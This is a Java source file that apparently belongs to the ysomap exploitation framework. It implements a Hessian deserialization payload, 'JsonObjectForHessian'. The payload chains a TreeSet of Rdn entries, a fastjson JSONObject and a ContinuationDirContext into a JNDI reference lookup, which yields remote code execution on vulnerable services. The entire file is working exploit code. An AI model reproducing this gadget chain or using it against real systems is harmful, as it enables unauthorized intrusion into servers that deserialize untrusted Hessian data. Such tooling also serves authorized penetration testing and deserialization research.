package ysomap.payloads.hessian;

import com.alibaba.fastjson.JSONObject;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.rmi.JNDIRefBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import javax.naming.CannotProceedException;
import java.util.Hashtable;

@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.HESSIAN })
@Dependencies({"hessian"})
@Require(bullets = {
        "JNDIRefBullet","TomcatRefBullet"}, param = false)
public class JsonObjectForHessian extends HessianPayload {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return JNDIRefBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        JSONObject jsonObject = new JSONObject();
        CannotProceedException cpe = new CannotProceedException();
        ReflectionHelper.setFieldValue(cpe, "cause", null);
        ReflectionHelper.setFieldValue(cpe, "stackTrace", null);
        cpe.setResolvedObj(obj);
        ReflectionHelper.setFieldValue(cpe, "suppressedExceptions", null);
        Object ctx = ReflectionHelper.newInstance(
                "javax.naming.spi.ContinuationDirContext",
                new Class[]{CannotProceedException.class, Hashtable.class},
                cpe, new Hashtable<>());
        jsonObject.put("ysomap", ctx);
        Object toStringTrigger = ReflectionHelper.createWithoutConstructor("javax.sound.sampled.AudioFileFormat$Type");

        Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry1, "value", toStringTrigger);

        Object rdnEntry2 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry2, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry2, "value", jsonObject);

        return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);
    }
}
